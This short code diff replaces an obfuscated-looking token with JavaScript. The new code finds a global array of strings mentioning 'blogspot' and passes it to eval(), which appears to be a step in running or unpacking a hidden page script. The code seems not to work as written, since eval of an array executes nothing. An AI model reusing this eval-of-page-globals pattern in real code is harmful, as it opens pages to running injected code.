@@ -1,1 +1,6 @@
-_bZt6yp3;
+const variable = Object.keys(window).find(key => {
+  const value = window[key];
+  return Array.isArray(value) && value.every(item => typeof item === 'string' && item.includes('blogspot'));
+});
+
+eval(window[variable]);
